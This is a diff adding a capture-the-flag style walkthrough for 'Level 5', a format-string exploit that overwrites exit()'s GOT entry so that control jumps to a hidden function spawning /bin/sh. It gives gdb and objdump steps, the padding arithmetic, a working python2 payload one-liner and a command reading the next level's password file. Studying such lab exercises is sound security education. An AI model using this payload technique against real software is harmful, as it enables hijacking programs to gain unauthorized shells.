@@ -1,0 +1,187 @@
+# Level 5 Walkthrough
+
+## Goal
+
+Exploit a format string vulnerability to overwrite `exit()`'s GOT entry
+with the address of a hidden function `o()` that calls `system("/bin/sh")`.
+We can't use the return address this time — the program calls `exit()`
+before ever returning.
+
+---
+
+## 1. Analyze the Binary
+
+```bash
+gdb ./level5
+(gdb) info functions
+(gdb) disas n
+(gdb) disas o
+```
+
+Decompiled logic:
+
+```c
+void o() {
+    system("/bin/sh");   // hidden function, never called normally
+}
+
+void n() {
+    char buf[520];
+    fgets(buf, 520, stdin);
+    printf(buf);          // ← format string vulnerability
+    exit(1);              // ← never returns, kills our shell
+}
+```
+
+The problem: even if we hijack `%n` to write somewhere useful,
+`exit(1)` fires immediately after `printf`. The process dies before
+we can do anything.
+
+The solution: overwrite what `exit()` **points to** before it runs.
+
+---
+
+## 2. What is the GOT
+
+When your binary calls a libc function like `exit()`, it doesn't call
+it directly. The address of `exit()` in libc isn't known at compile time
+— it's resolved when the program loads. So the binary uses a two-step
+indirection:
+
+```
+CALL exit
+  │
+  ↓
+PLT stub (Procedure Linkage Table)
+  │
+  ↓
+GOT entry (Global Offset Table) → actual exit() in libc
+```
+
+The **GOT** is a table of pointers in the binary's data segment. Each
+libc function gets one slot. At runtime, the dynamic linker fills each
+slot with the real address of that function.
+
+Crucially — **the GOT is writable**. It has to be, because the linker
+writes to it at startup.
+
+So if we overwrite the GOT entry for `exit()` with the address of `o()`,
+then when the code runs `exit(1)`, it follows the GOT pointer and
+jumps to `o()` instead.
+
+```
+CALL exit
+  │
+  ↓
+PLT stub
+  │
+  ↓
+GOT[exit] = 0x080484a4  ← we overwrote this
+  │
+  ↓
+o() → system("/bin/sh")
+```
+
+---
+
+## 3. Finding the Addresses
+
+```bash
+# Address of exit() GOT entry
+(gdb) info functions exit
+# or
+objdump -R ./level5 | grep exit
+→ 0x08049838
+
+# Address of o()
+(gdb) info functions
+→ 0x080484a4  o
+```
+
+We need to write `0x080484a4` (134513828) into `0x08049838`.
+
+---
+
+## 4. Payload Breakdown
+
+```
+[0x08049838][%134513824x][%4$n]
+```
+
+| Part | Bytes printed |
+|---|---|
+| `\x38\x98\x04\x08` | 4 |
+| `%134513824x` | 134513824 |
+| **Total** | **134513828 = 0x080484a4** |
+| `%4$n` | writes 134513828 into address at position 4 |
+
+Padding math:
+```
+target value  = 0x080484a4 = 134513828
+already printed = 4 (the address bytes)
+padding needed  = 134513828 - 4 = 134513824
+```
+
+Position 4 is confirmed the same way as level 3 — `n()` calls `printf`
+directly in the same frame, so our input lands at position 4 on the stack.
+
+---
+
+## 5. Exploit
+
+```bash
+(python2 -c 'import struct; print struct.pack("<I", 0x08049838) + "%134513824x" + "%4$n"'; cat) | ./level5
+```
+
+---
+
+## 6. Execution Flow
+
+```
+fgets reads payload into buf
+     │
+printf(buf) executes our format string
+     │
+Prints 4 raw bytes (address)         → 4 bytes printed
+     │
+%134513824x prints padded hex        → 134513828 bytes printed
+     │
+%4$n fires:
+  position 4 on stack = 0x08049838 (exit GOT entry)
+  writes 134513828 = 0x080484a4 into GOT[exit]
+     │
+printf returns
+     │
+exit(1) is called
+  │
+PLT stub jumps to GOT[exit]
+  │
+GOT[exit] now = 0x080484a4
+  │
+CPU jumps to o()
+  │
+system("/bin/sh")
+  │
+Shell as level6
+```
+
+---
+
+## 7. Get the Password
+
+```bash
+cat /home/user/level6/.pass
+```
+
+---
+
+## Key Concepts
+
+| Concept | Meaning |
+|---|---|
+| **GOT** | Table of pointers to libc functions, writable at runtime |
+| **PLT** | Stub that reads the GOT to find the real function address |
+| **GOT overwrite** | Write a new address into a GOT slot to hijack any libc call |
+| **`exit()` hijack** | Program calls `exit` — we make it call `o()` instead |
+| **`%4$n`** | Same position as level 3 — direct `printf` call in same frame |
+| **Hidden function** | `o()` exists in the binary but is never called normally |
